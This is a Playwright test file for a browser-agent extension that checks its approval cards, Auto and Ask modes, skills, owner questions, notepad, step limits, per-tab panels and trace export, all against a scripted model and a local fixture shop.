  await panel.getByRole('button', { name: 'Allow once' }).click(); // the site
  await expect(panel.locator('#card-text')).toContainText(`Submit this form ("Submit order") to ${fixture.main}/post (POST)`, { timeout: 30_000 });
  await expect(panel.locator('#card-text')).toContainText('Test User');
  expect(posts()).toBe(start);
  await panel.getByRole('button', { name: 'Allow once' }).click();
  await expect(panel.locator('.agent').last()).toHaveText('Submitted.', { timeout: 30_000 });
  expect(posts()).toBe(start + 1);

  // 2. A follow-up continues on the page the agent is on (no site card); "Allow in chat" for the form.
  model.script(plan());
  await panel.locator('#goal').fill('Order again');
  await panel.getByRole('button', { name: 'Send' }).click();
  await expect(panel.locator('#card-text')).toContainText('Submit this form', { timeout: 30_000 });
  await panel.getByRole('button', { name: 'Allow in chat' }).click();
  await expect(panel.locator('.agent')).toHaveCount(2, { timeout: 30_000 });
  await expect(panel.locator('.agent').last()).toHaveText('Submitted.');
  expect(posts()).toBe(start + 2);

  // 3. Still the same conversation: no card at all.
  model.script(plan());
  const cards = await panel.evaluate(() => { let seen = 0; new MutationObserver(() => { if (!document.getElementById('card')!.hidden) seen += 1; })
    .observe(document.getElementById('card')!, { attributes: true }); (window as unknown as { cardsSeen: () => number }).cardsSeen = () => seen; return 0; });
  await panel.locator('#goal').fill('And again');
  await panel.getByRole('button', { name: 'Send' }).click();
  await expect(panel.locator('.agent')).toHaveCount(3, { timeout: 30_000 });
  await expect(panel.locator('.agent').last()).toHaveText('Submitted.');
  expect(posts()).toBe(start + 3);
  expect(await panel.evaluate(() => (window as unknown as { cardsSeen: () => number }).cardsSeen())).toBe(cards);

  // 4. A new conversation forgets it all. Auto approves the site without more cards, but the form still asks.
  model.script(plan());
  await panel.getByRole('button', { name: 'New conversation' }).click();
  await panel.locator('#goal').fill('One more');
  await panel.getByRole('button', { name: 'Send' }).click();
  if (process.env['SCREENSHOTS']) {
    await panel.setViewportSize({ width: 380, height: 520 });
    await expect(panel.locator('#card')).toBeVisible();
    await panel.screenshot({ path: path.join(process.env['SCREENSHOTS'], 'card-site.png') });
  }
  await panel.getByRole('button', { name: 'Auto', exact: true }).click(); // the site
  await expect(panel.locator('#mode')).toHaveText(/^Auto/);
  await expect(panel.locator('#mode')).toHaveClass(/auto/);
  await expect(panel.locator('#card-text')).toContainText('Submit this form', { timeout: 30_000 });
  await expect(panel.getByRole('button', { name: 'Auto', exact: true })).toBeHidden();
  if (process.env['SCREENSHOTS']) await panel.screenshot({ path: path.join(process.env['SCREENSHOTS'], 'card-form-auto.png') });
  await panel.getByRole('button', { name: 'Deny' }).click();
  await expect(panel.locator('.agent').last()).toHaveText('Not submitted.', { timeout: 30_000 });
  expect(posts()).toBe(start + 3);

  // Auto carries over to the next conversation, visibly; the composer's mode menu turns it off.
  await panel.getByRole('button', { name: 'New conversation' }).click();
  await expect(panel.locator('#mode')).toHaveText(/^Auto/);
  await panel.locator('#mode').click();
  if (process.env['SCREENSHOTS']) {
    await panel.setViewportSize({ width: 380, height: 420 });
    await panel.screenshot({ path: path.join(process.env['SCREENSHOTS'], 'mode-menu.png') });
  }
  await panel.getByRole('menuitemradio', { name: /^Ask/ }).click();
  if (process.env['SCREENSHOTS']) await panel.screenshot({ path: path.join(process.env['SCREENSHOTS'], 'mode-ask.png') });
  await expect(panel.locator('#mode')).toHaveText(/^Ask/);
  await expect(panel.locator('#mode')).not.toHaveClass(/auto/);
  await panel.close();
});

test('Auto: a search (GET) goes through without a card; the next conversation starts in Ask again once switched back', async () => {
  model.script([
    () => ({ call: { action: 'navigate', url: `${fixture.main}/shop?t=auto-get` } }),
    ({ observation }) => ({ call: { action: 'fill', observation: observation!.id, target: { ref: refOf(observation, /searchbox|textbox/, /Search/) }, value: 'red cup' } }),
    ({ observation }) => ({ call: { action: 'press', observation: observation!.id, target: { ref: refOf(observation, /searchbox|textbox/, /Search/) }, key: 'Enter' } }),
    ({ observation }) => ({ text: observation?.url.includes('/search?q=red+cup') ? 'Searched without asking.' : `Unexpected: ${observation?.url}` }),
  ]);
  const panel = await openPanel();
  await panel.getByRole('button', { name: 'New conversation' }).click();
  await panel.locator('#mode').click();
  await panel.getByRole('menuitemradio', { name: /^Auto/ }).click();
  await expect(panel.locator('#mode')).toHaveText(/^Auto/);
  const cards = await panel.evaluate(() => { let seen = 0; new MutationObserver(() => { if (!document.getElementById('card')!.hidden) seen += 1; })
    .observe(document.getElementById('card')!, { attributes: true }); (window as unknown as { cardsSeen: () => number }).cardsSeen = () => seen; return 0; });
  try {
    await panel.locator('#goal').fill('Search the shop for a red cup');
    await panel.getByRole('button', { name: 'Send' }).click();
    await expect(panel.locator('.agent').last()).toHaveText('Searched without asking.', { timeout: 30_000 });
    expect(await panel.evaluate(() => (window as unknown as { cardsSeen: () => number }).cardsSeen())).toBe(cards);
    expect(fixture.requests.main).toContain('GET /search?q=red+cup');
  } finally {
    await panel.locator('#mode').click();
    await panel.getByRole('menuitemradio', { name: /^Ask/ }).click();
    await expect(panel.locator('#mode')).toHaveText(/^Ask/);
    await panel.close();
  }
});

test('shows the halo and the agent cursor on its page while it works, never in what the model reads', async () => {
  let duringRun = { overlay: 0, grouped: false };
  model.script([
    () => ({ call: { action: 'navigate', url: `${fixture.main}/shop?t=halo` } }),
    async () => {
      const page = context.pages().find((p) => p.url() === `${fixture.main}/shop?t=halo`)!;
      duringRun = { overlay: await page.locator('valet-overlay').count(), grouped: false };
      return { text: 'Looked.' };
    },
  ]);
  const panel = await runGoal('Look at the shop');
  await panel.getByRole('button', { name: 'Allow once' }).click();
  await expect(panel.locator('.agent').last()).toHaveText('Looked.', { timeout: 30_000 });
  expect(duringRun.overlay).toBe(1);
  const page = context.pages().find((p) => p.url() === `${fixture.main}/shop?t=halo`)!;
  await expect(page.locator('valet-overlay')).toHaveCount(0); // gone once the run ended
  expect(JSON.stringify(model.requests)).not.toContain('valet-overlay');
  await panel.close();
});


test('skills: written in Settings, read on the sites they name, brought in with @, and drafted from a conversation', async () => {
  const host = new URL(fixture.main).hostname;
  const panel = await openPanel();
  await panel.getByRole('button', { name: 'New conversation' }).click();
  await panel.getByRole('button', { name: 'Settings' }).click();
  // Two skills: one for the fixture shop, one for every task.
  await panel.getByRole('button', { name: 'Add a skill' }).click();
  await panel.getByLabel('Name').fill('Shop tips');
  await panel.getByLabel('Sites').fill(`${host}, nonsense host`);
  await panel.getByLabel('What the agent should know').fill('Use the search box, never the category links.');
  await panel.getByRole('button', { name: 'Save', exact: true }).click();
  await expect(panel.locator('#skill-error')).toHaveText(/"nonsense host" is not a site/);
  await panel.getByLabel('Sites').fill(host);
  await panel.getByRole('button', { name: 'Save', exact: true }).click();
  await panel.getByRole('button', { name: 'Add a skill' }).click();
  await panel.getByLabel('Name').fill('House style');
  await panel.getByLabel('What the agent should know').fill('Answer in one line.');
  await panel.getByRole('button', { name: 'Save', exact: true }).click();
  await expect(panel.locator('.skills li .title')).toHaveText(['House style', 'Shop tips']);
  await expect(panel.locator('.skills li small')).toHaveText(['Every task', host]);
  // Off means not read.
  await panel.getByLabel('House style on').uncheck();
  await expect(panel.locator('.skills li.off')).toHaveCount(1);
  await panel.getByRole('button', { name: 'Back' }).click();

  model.script([
    // A step first: only a run that took steps has anything to save as a skill.
    () => ({ call: { action: 'observe' } }),
    ({ messages }) => ({ text: `SEEN ${String(messages.find((message) => message.role === 'user')?.content ?? '')}` }),
    ({ messages }) => ({ text: String(messages.at(-1)?.content ?? '').includes('in particular: the search part') ? 'Open the shop.\nSearch for the item.\nNAME: Shop search' : 'no steer seen' }),
    ({ messages }) => ({ text: String(messages.at(-1)?.content ?? '').includes('as written before:\nOpen the shop.\nSearch for the item.') && String(messages.at(-1)?.content).includes('owner asks: shorter') ? 'Search for the item.\nNAME: Shop search' : 'no rewrite seen' }),
  ]);
  const shop = await context.newPage();
  await shop.goto(`${fixture.main}/shop`);
  await shop.bringToFront();
  await expect(panel.locator('#tab-title')).toHaveText('Fixture shop');
  await panel.locator('#goal').fill('Find mugs');
  await panel.getByRole('button', { name: 'Send' }).click();
  const answer = panel.locator('.agent').last();
  await expect(answer).toContainText(`Shop tips (${host})`, { timeout: 30_000 });
  await expect(answer).toContainText('Use the search box, never the category links.');
  await expect(answer).not.toContainText('House style');
  await expect(panel.locator('.notice')).toHaveText(['Using skill: Shop tips']);

  // @ in the message box lists the skills that are on; a pick becomes a chip and goes with the message.
  await panel.locator('#goal').pressSequentially('And @');
  await expect(panel.locator('#skill-menu')).toBeVisible();
  await expect(panel.locator('#skill-menu .title')).toHaveText(['Shop tips']);
  await panel.locator('#skill-menu button').click();
  await expect(panel.locator('.skill-chip')).toHaveText(/@Shop tips/);
  await expect(panel.locator('#goal')).toHaveValue('And ');

  // "Save as skill" takes a steer, asks the model for a draft and opens it in the form, unsaved; Rewrite sends it back with a change.
  await panel.locator('.skill-chip button').click();
  await panel.getByRole('button', { name: 'Save as skill' }).click();
  await panel.getByLabel('What the note should be about (optional)').fill('the search part');
  await panel.getByRole('button', { name: 'Write it' }).click();
  await expect(panel.locator('#settings-view')).toBeVisible({ timeout: 30_000 });
  await expect(panel.getByLabel('Name')).toHaveValue('Shop search');
  await expect(panel.getByLabel('Sites')).toHaveValue(host);
  await expect(panel.getByLabel('What the agent should know')).toHaveValue('Open the shop.\nSearch for the item.');
  await expect(panel.locator('.skills li')).toHaveCount(2);
  await panel.getByLabel('What to change in the draft').fill('shorter');
  await panel.getByRole('button', { name: 'Rewrite' }).click();
  await expect(panel.getByLabel('What the agent should know')).toHaveValue('Search for the item.', { timeout: 30_000 });
  await panel.getByRole('button', { name: 'Cancel' }).click();
  // The same offer lives in the conversation menu; a skill typed by hand has no Rewrite.
  await panel.getByRole('button', { name: 'Back' }).click();
  await panel.getByRole('button', { name: 'More' }).click();
  await panel.getByRole('menuitem', { name: /Save as skill/ }).click();
  await expect(panel.getByLabel('What the note should be about (optional)')).toBeFocused();
  await panel.keyboard.press('Escape');
  await expect(panel.locator('.save-skill-card')).toHaveCount(0);
  await panel.getByRole('button', { name: 'Settings' }).click();
  await panel.getByRole('button', { name: 'Add a skill' }).click();
  await expect(panel.locator('#skill-rewrite-row')).toBeHidden();
  await panel.getByRole('button', { name: 'Cancel' }).click();
  await expect(panel.locator('.skills li')).toHaveCount(2);
  // Cleaned up for the tests after this one.
  for (const name of ['Shop tips', 'House style']) await panel.getByRole('button', { name: `Remove ${name}` }).click();
  await expect(panel.locator('.skills .empty-row')).toBeVisible();
  await shop.close();
  await panel.close();
});

test('copies an answer and the whole conversation, and saves it as one HTML file with the screenshot in it', async () => {
  model.script([
    () => ({ call: { action: 'screenshot' } }),
    () => ({ text: 'Here is **what I saw**.' }),
  ]);
  const shop = await context.newPage();
  await shop.goto(`${fixture.main}/shop`);
  const panel = await openPanel();
  await panel.getByRole('button', { name: 'New conversation' }).click();
  await expect(panel.getByRole('button', { name: 'More' })).toBeDisabled();
  await shop.bringToFront();
  await expect(panel.locator('#tab-title')).toHaveText('Fixture shop');
  await panel.locator('#goal').fill('Look around');
  await panel.getByRole('button', { name: 'Send' }).click();
  await expect(panel.locator('.agent').last()).toContainText('what I saw', { timeout: 30_000 });
  await expect(panel.locator('.step .shot img')).toBeVisible();

  await context.grantPermissions(['clipboard-read', 'clipboard-write']);
  await panel.getByRole('button', { name: 'Copy this answer' }).click();
  await expect(panel.getByRole('button', { name: 'Copied' })).toBeVisible();
  expect(await panel.evaluate(() => navigator.clipboard.readText())).toBe('Here is **what I saw**.');

  await panel.getByRole('button', { name: 'More' }).click();
  // Under the header, not above it.
  await expect(panel.getByRole('menuitem', { name: /Copy conversation/ })).toBeInViewport({ ratio: 1 });
  await panel.getByRole('menuitem', { name: /Copy conversation/ }).click();
  const markdown = await panel.evaluate(() => navigator.clipboard.readText());
  expect(markdown).toContain('# Look around');
  expect(markdown).toContain('**You:** Look around');
  expect(markdown).toContain('- Took a screenshot');
  expect(markdown).toContain('**Agent:**\n\nHere is **what I saw**.');

  await panel.getByRole('button', { name: 'More' }).click();
  const [download] = await Promise.all([panel.waitForEvent('download'), panel.getByRole('menuitem', { name: /Save as HTML/ }).click()]);
  expect(download.suggestedFilename()).toMatch(/^valet-.*\.html$/);
  const html = await (await import('node:fs/promises')).readFile(await download.path(), 'utf8');
  expect(html).toContain('<title>Look around</title>');
  expect(html).toContain('Here is **what I saw**.');
  expect(html).toMatch(/<img src="data:image\/jpeg;base64,[A-Za-z0-9+/=]{100,}" alt="Took a screenshot">/);
  await shop.close();
  await panel.close();
});

test('a question with many long options scrolls: no option is squeezed, the Suggested tag stays on one line', async () => {
  const options = [
    { label: 'Remove empty/tiny labels: WhatsApp (0), DeltaChat (1), cc-automated (2)', hint: '0 conversations (empty), 1 conversation, and 2 conversations respectively' },
    { label: 'Remove small/old labels: SMS API (4) & Africa-Trip (7)', hint: '4 conversations and 7 conversations respectively' },
    { label: 'Remove legacy phone sync labels: Call log (1,765) & SMS (1,023)', hint: 'Old phone backup labels; removing a label does not delete the emails' },
    { label: "Rename 'API OHV' to 'API OVH' (fix typo)", hint: "Currently named 'API OHV' (919 conversations from support@ovh.com)" },
    { label: 'Apply recommended productivity settings (Inbox, General & Sidebar)', hint: "Turn on Send & Archive, Auto-advance, Don't override filters, Show if unread" },
  ];
  model.script([
    () => ({ tool: 'ask_owner', call: { question: 'Which label cleanups would you like me to apply?', options, multi: true } }),
    () => ({ text: 'Done.' }),
  ]);
  const panel = await openPanel();
  try {
    await panel.setViewportSize({ width: 400, height: 760 });
    await panel.getByRole('button', { name: 'New conversation' }).click();
    await panel.locator('#goal').fill('Clean up my labels');
    await panel.getByRole('button', { name: 'Send' }).click();
    const ask = panel.getByRole('group', { name: 'Which label cleanups would you like me to apply?' });
    await expect(ask).toBeVisible({ timeout: 30_000 });
    await panel.screenshot({ path: test.info().outputPath('long-options.png') });
    const rows = await ask.locator('.ask-option:not(.ask-other)').evaluateAll((buttons) => buttons.map((button) => ({ overflow: button.scrollHeight - button.clientHeight })));
    expect(rows).toHaveLength(options.length);
    for (const row of rows) expect(row.overflow).toBeLessThanOrEqual(1);
    const tag = ask.locator('.ask-option .tag').first();
    await expect(tag).toHaveText('Suggested');
    expect((await tag.boundingBox())!.height).toBeLessThan(24);
    // The list scrolls to reach the last option.
    expect(await ask.locator('.ask-options').evaluate((list) => list.scrollHeight > list.clientHeight)).toBe(true);
    await ask.getByRole('button', { name: 'Stop' }).click();
  } finally {
    await panel.close();
  }
});

test('a question from the agent: picked with one click, or answered by typing, and never shown as an approval', async () => {
  const answerOf = (messages: Array<{ role: string; content?: string | null }>) => String(messages.filter((message) => message.role === 'tool').at(-1)?.content ?? '');
  model.script([
    () => ({ tool: 'ask_owner', call: { question: 'Which mug should I look at?', options: [{ label: 'Blue mug', hint: 'The cheapest' }, { label: 'Red mug' }] } }),
    ({ messages }) => ({ tool: 'ask_owner', call: { question: `Heard ${JSON.parse(answerOf(messages)).answer}. Gift wrap?`, options: [{ label: 'Yes' }, { label: 'No' }] } }),
    ({ messages }) => ({ text: `Answer: ${JSON.parse(answerOf(messages)).answer}` }),
  ]);
  const panel = await openPanel();
  try {
    await panel.getByRole('button', { name: 'New conversation' }).click();
    await panel.locator('#goal').fill('Help me pick a mug');
    await panel.getByRole('button', { name: 'Send' }).click();
    const ask = panel.getByRole('group', { name: 'Which mug should I look at?' });
    await expect(ask).toBeVisible({ timeout: 30_000 });
    await expect(panel.locator('#card')).toBeHidden();
    // The question takes the composer's place; Stop moves into it.
    await expect(panel.locator('#box')).toBeHidden();
    await expect(ask.getByRole('button', { name: 'Stop' })).toBeVisible();
    await expect(ask.getByRole('button', { name: /Blue mug.*Suggested.*The cheapest/ })).toBeFocused();
    await panel.screenshot({ path: test.info().outputPath('question.png') });
    await ask.getByRole('button', { name: /Red mug/ }).click();
    // The second question: answered in words of the owner's own, under "Something else…".
    const second = panel.getByRole('group', { name: 'Heard Red mug. Gift wrap?' });
    await expect(second).toBeVisible({ timeout: 30_000 });
    await second.getByRole('button', { name: 'Something else…' }).click();
    await expect(second.getByRole('textbox', { name: 'Your answer' })).toBeFocused();
    await second.getByRole('textbox', { name: 'Your answer' }).fill('Only if it is free');
    await second.getByRole('textbox', { name: 'Your answer' }).press('Enter');
    await expect(panel.locator('.agent').last()).toHaveText('Answer: Only if it is free', { timeout: 30_000 });
    await expect(panel.locator('#ask')).toBeHidden();
    await expect(panel.locator('#box')).toBeVisible();
    // The transcript keeps each question with its answer.
    await expect(panel.locator('#transcript .owner')).toHaveText(['Help me pick a mug', 'Red mug', 'Only if it is free']);
  } finally {
    await panel.close();
  }
});

test('the agent\'s notepad: notes show as steps, the model reads the latest at the end of each turn, and the owner reads and exports it', async () => {
  const lastText = (messages: Array<{ content?: unknown }>) => JSON.stringify(messages.at(-1)?.content ?? '');
  model.script([
    () => ({ tool: 'notepad', call: { append: 'Blue mug: $12.40, ships tomorrow' } }),
    ({ messages }) => ({ tool: 'notepad', call: { append: lastText(messages).includes('Blue mug: $12.40') ? 'Red mug: $14.00' : 'NOTEPAD NOT SHOWN' } }),
    ({ messages }) => ({ text: lastText(messages).includes('Red mug: $14.00') ? 'Both noted.' : 'Lost my notes.' }),
  ]);
  const panel = await openPanel();
  try {
    await panel.getByRole('button', { name: 'New conversation' }).click();
    await panel.locator('#goal').fill('Note the mug prices');
    await panel.getByRole('button', { name: 'Send' }).click();
    await expect(panel.locator('.agent').last()).toHaveText('Both noted.', { timeout: 30_000 });
    await panel.locator('.activity > details > summary').last().click();
    await expect(panel.locator('.activity .action')).toHaveText(['Noted: Blue mug: $12.40, ships tomorrow', 'Noted: Red mug: $14.00']);

    await panel.getByRole('button', { name: 'More' }).click();
    await expect(panel.locator('#notepad-hint')).toHaveText('2 lines the agent wrote down while it worked');
    await panel.getByRole('menuitem', { name: /Agent's notepad/ }).click();
    const notepad = panel.getByRole('dialog', { name: 'Agent\'s notepad' });
    await expect(notepad).toBeVisible();
    await expect(notepad.locator('pre')).toHaveText('Blue mug: $12.40, ships tomorrow\nRed mug: $14.00');
    await panel.screenshot({ path: test.info().outputPath('notepad.png') });
    await notepad.getByRole('button', { name: 'Close' }).click();
    await expect(notepad).toBeHidden();

    // A new conversation has an empty notepad: the item is there, and off.
    await panel.getByRole('button', { name: 'New conversation' }).click();
    await expect(panel.locator('#open-notepad')).toBeDisabled();
  } finally {
    await panel.close();
  }
});

test('a run that stops at its limit offers Continue, and Settings sets the limit (100 steps until picked)', async () => {
  model.script([
    () => ({ call: { action: 'navigate', url: `${fixture.main}/shop?t=limit` } }),
    ...Array.from({ length: 39 }, () => () => ({ call: { action: 'observe' } })),
    () => ({ text: 'Picked up where I stopped.' }),
  ]);
  const panel = await openPanel();
  try {
    // 100 steps until the owner picks: this run checks in after 40.
    await panel.getByRole('button', { name: 'Settings' }).click();
    await expect(panel.getByRole('radio', { name: '100 steps' })).toBeChecked();
    await panel.getByRole('radio', { name: '40 steps' }).check({ force: true });
    await expect(panel.locator('#limit-note')).toContainText('after 40 browser actions or 20 minutes');
    await panel.getByRole('button', { name: 'Settings' }).click();
    await panel.getByRole('button', { name: 'New conversation' }).click();
    await panel.locator('#goal').fill('Look around for a while');
    await panel.getByRole('button', { name: 'Send' }).click();
    await panel.getByRole('button', { name: 'Allow once' }).click({ timeout: 30_000 });
    await expect(panel.locator('#transcript .notice').last()).toHaveText(/^Stopped after 40 browser actions/, { timeout: 60_000 });
    await panel.getByRole('button', { name: 'Continue', exact: true }).click();
    await expect(panel.locator('.agent').last()).toHaveText('Picked up where I stopped.', { timeout: 30_000 });
    await expect(panel.getByRole('button', { name: 'Continue', exact: true })).toHaveCount(0);
    await expect(panel.locator('#transcript .owner').last()).toHaveText('Continue');

    // Settings → Check in after: kept for the next run.
    await panel.getByRole('button', { name: 'Settings' }).click();
    await expect(panel.getByRole('radio', { name: '40 steps' })).toBeChecked();
    await panel.getByRole('radio', { name: '200 steps' }).check({ force: true });
    await expect(panel.locator('#limit-note')).toContainText('after 200 browser actions or 90 minutes');
    expect(await panel.evaluate(async () => (await (globalThis as any).chrome.storage.local.get('agent:limit'))['agent:limit'])).toBe(200);
    await panel.getByRole('radio', { name: '100 steps' }).check({ force: true });
    await panel.getByRole('button', { name: 'Settings' }).click();
  } finally {
    await panel.close();
  }
});

test('Learning: each step waits for Next, with the bubble in the page saying what comes and why', async () => {
  model.script([
    () => ({ call: { action: 'navigate', url: `${fixture.main}/shop?t=learn` } }),
    ({ observation }) => ({ text: 'The mug is a link; I will open it.', call: { action: 'click', observation: observation!.id, target: { ref: refOf(observation, /link/, /Blue mug/) } } }),
    () => ({ text: 'Opened the mug.' }),
  ]);
  const panel = await openPanel();
  await panel.getByRole('button', { name: 'Learn' }).click();
  await expect(panel.getByRole('button', { name: 'Learn' })).toHaveAttribute('aria-pressed', 'true');
  try {
    await panel.getByRole('button', { name: 'New conversation' }).click();
    await panel.locator('#goal').fill('Open the blue mug');
    await panel.getByRole('button', { name: 'Send' }).click();
    // The first step waits before anything is dispatched: no tab, no card yet.
    await expect(panel.locator('#step-text')).toHaveText(`Open ${fixture.main}/shop?t=learn`, { timeout: 30_000 });
    await expect(panel.locator('#status')).toContainText('Waiting for you');
    expect(context.pages().some((p) => p.url().includes('t=learn'))).toBe(false);
    await panel.getByRole('button', { name: 'Next step' }).click();
    await panel.getByRole('button', { name: 'Allow once' }).click();
    // The second step is previewed in the page: the cursor on the link, the bubble with the model's reason.
    await expect(panel.locator('#step-text')).toHaveText('Click link "Blue mug"', { timeout: 30_000 });
    await expect(panel.locator('#step-why')).toHaveText('The mug is a link; I will open it.');
    const shop = context.pages().find((p) => p.url().includes('t=learn'))!;
    await expect(shop.locator('valet-overlay')).toHaveAttribute('data-step', 'Click link "Blue mug"');
    await panel.getByRole('button', { name: 'Next step' }).click();
    await expect(panel.locator('.agent').last()).toHaveText('Opened the mug.', { timeout: 30_000 });
    await expect(panel.locator('#step')).toBeHidden();
    await expect(shop.locator('valet-overlay')).toHaveCount(0);
  } finally {
    await panel.getByRole('button', { name: 'Learn' }).click();
    await expect(panel.getByRole('button', { name: 'Learn' })).toHaveAttribute('aria-pressed', 'false');
    await panel.close();
  }
});

test('the panel is per tab: a tab\'s panel has a conversation of its own, which ends when the tab closes', async () => {
  model.script([() => ({ text: 'Hello from the shop.' }), () => ({ text: 'Hello from the reviews.' })]);
  const shop = await context.newPage();
  await shop.goto(`${fixture.main}/shop`);
  const other = await context.newPage();
  await other.goto(`${fixture.main}/inject`);
  const main = await openPanel();
  type Options = { tabId?: number; path?: string; enabled?: boolean };
  const ext = (page: Page) => ({
    tabIds: () => page.evaluate(async (base) => Object.fromEntries((await (globalThis as any).chrome.tabs.query({ url: `${base}/*` })).map((tab: { url: string; id: number }) => [new URL(tab.url).pathname, tab.id])), fixture.main) as Promise<Record<string, number>>,
    panelOptions: (tabId?: number) => page.evaluate((id) => (globalThis as any).chrome.sidePanel.getOptions(id === undefined ? {} : { tabId: id }), tabId) as Promise<Options>,
    stored: (key: string) => page.evaluate(async (k) => (await (globalThis as any).chrome.storage.session.get(k))[k], key) as Promise<unknown>,
  });
  const ids = await ext(main).tabIds();
  const shopId = ids['/shop']!;
  const otherId = ids['/inject']!;
  // The worker gave every tab a panel of its own, and no panel is the default.
  await expect.poll(() => ext(main).panelOptions(shopId)).toMatchObject({ tabId: shopId, path: `panel.html?tab=${shopId}`, enabled: true });
  expect((await ext(main).panelOptions()).enabled).toBe(false);

  const shopPanel = await context.newPage();
  await shopPanel.goto(`chrome-extension://${EXTENSION_ID}/panel.html?tab=${shopId}`);
  const otherPanel = await context.newPage();
  await otherPanel.goto(`chrome-extension://${EXTENSION_ID}/panel.html?tab=${otherId}`);
  // Each panel is its tab's, whichever tab the owner looks at.
  await main.bringToFront();
  await expect(shopPanel.locator('#tab-title')).toHaveText('Fixture shop');
  await expect(shopPanel.locator('#where')).toHaveAttribute('data-tip', /^Will work in this tab: Fixture shop/);
  await expect(otherPanel.locator('#tab-title')).toHaveText('Customer reviews');
  // Two conversations: each panel sees its own messages only.
  await shopPanel.locator('#goal').fill('Say hello');
  await shopPanel.getByRole('button', { name: 'Send' }).click();
  await expect(shopPanel.locator('.agent').last()).toHaveText('Hello from the shop.', { timeout: 30_000 });
  await otherPanel.locator('#goal').fill('Say hello too');
  await otherPanel.getByRole('button', { name: 'Send' }).click();
  await expect(otherPanel.locator('.agent').last()).toHaveText('Hello from the reviews.', { timeout: 30_000 });
  await expect(otherPanel.locator('.owner')).toHaveText(['Say hello too']);
  await expect(shopPanel.locator('.owner')).toHaveText(['Say hello']);
  await expect(main.locator('.owner')).not.toContainText('Say hello');
  expect(await ext(main).stored('agent:conversations')).toEqual(expect.arrayContaining([`tab:${shopId}`, `tab:${otherId}`]));

  // Closing the tab ends its conversation: nothing of it is kept; the other goes on.
  await shop.close();
  await expect.poll(() => ext(main).stored(`agent:conversation:tab:${shopId}`)).toBeUndefined();
  await expect.poll(() => ext(main).stored('agent:conversations')).not.toContain(`tab:${shopId}`);
  expect(await ext(main).stored('agent:conversations')).toContain(`tab:${otherId}`);
  await expect(otherPanel.locator('.owner')).toHaveText(['Say hello too']);
  await shopPanel.close();
  await otherPanel.close();
  await other.close();
  await main.close();
});

test('a frame another extension plants at the first keystroke does not stop the agent typing, submitting or reading the page', async () => {
  model.script([
    () => ({ call: { action: 'navigate', url: `${fixture.main}/shop?t=planted` } }),
    ({ observation }) => ({ call: { action: 'fill', observation: observation!.id, target: { ref: refOf(observation, /searchbox|textbox/, /Search/) }, value: 'blue mug' } }),
    ({ observation }) => ({ call: { action: 'press', observation: observation!.id, target: { ref: refOf(observation, /searchbox|textbox/, /Search/) }, key: 'Enter' } }),
    ({ observation }) => ({ text: observation?.url.includes('/search?q=blue+mug') && !/Planted/.test(JSON.stringify(observation)) ? 'Typed, submitted, and read the page after.' : `Unexpected: ${observation?.url}` }),
  ]);
  // Natural pace types key by key, which is when a frame planted at the first key gets in the debugger's way.
  let panel = await openPanel();
  await panel.getByRole('button', { name: 'Settings' }).click();
  await panel.getByRole('radio', { name: /Natural/ }).check();
  await panel.getByRole('button', { name: 'Back' }).click();
  await panel.close();
  try {
    panel = await runGoal('Search the shop for a blue mug');
    await panel.getByRole('button', { name: 'Allow once' }).click();
    await expect(panel.locator('#card-text')).toContainText('Submit this form ("Search")', { timeout: 30_000 });
    await panel.getByRole('button', { name: 'Allow once' }).click();
    await expect(panel.locator('.agent').last()).toHaveText('Typed, submitted, and read the page after.', { timeout: 30_000 });
    await expect(panel.locator('.action')).toHaveText([`Opened ${fixture.main}/shop?t=planted`, /^Typed into (search|text)box "Search"$/, /^Pressed Enter on (search|text)box "Search"$/]);
    expect(fixture.requests.main).toContain('GET /search?q=blue+mug');
  } finally {
    await panel.getByRole('button', { name: 'Settings' }).click();
    await panel.getByRole('radio', { name: /Fast/ }).check();
    await panel.close();
  }
});

test('saves a run trace: every model turn, the call with its arguments and result, and what the file holds', async () => {
  model.script([
    () => ({ text: 'Reading the shop first.', call: { action: 'observe' } }),
    () => ({ text: 'The shop is open.' }),
  ]);
  const shop = await context.newPage();
  await shop.goto(`${fixture.main}/shop?t=trace`);
  const panel = await openPanel();
  await panel.getByRole('button', { name: 'New conversation' }).click();
  await shop.bringToFront();
  await panel.locator('#goal').fill('Look at the shop');
  await panel.getByRole('button', { name: 'Send' }).click();
  await expect(panel.locator('.agent').last()).toHaveText('The shop is open.', { timeout: 30_000 });
  await panel.getByRole('button', { name: 'More' }).click();
  const [download] = await Promise.all([panel.waitForEvent('download'), panel.getByRole('menuitem', { name: /Save run trace/ }).click()]);
  expect(download.suggestedFilename()).toMatch(/^valet-trace-.*\.json$/);
  const trace = JSON.parse(await (await import('node:fs/promises')).readFile(await download.path(), 'utf8')) as {
    valetTrace: number; note: string; events: Array<Record<string, unknown>>; transcript: unknown[]; history: unknown[];
  };
  expect(trace.valetTrace).toBe(1);
  expect(trace.note).toMatch(/Share it with care/);
  const kinds = trace.events.map((event) => event['kind']);
  expect(kinds).toEqual(expect.arrayContaining(['run', 'phase', 'model-request', 'model-response', 'call']));
  expect(trace.events.find((event) => event['kind'] === 'run')).toMatchObject({ goal: 'Look at the shop', where: `${fixture.main}/shop?t=trace` });
  const call = trace.events.find((event) => event['kind'] === 'call') as { args: unknown; outcome: string; result: { observation?: { url: string } } };
  expect(call).toMatchObject({ args: { action: 'observe' }, outcome: 'ok' });
  expect(call.result.observation?.url).toBe(`${fixture.main}/shop?t=trace`);
  expect(trace.history.length).toBeGreaterThan(2);
  await shop.close();
  await panel.close();
});
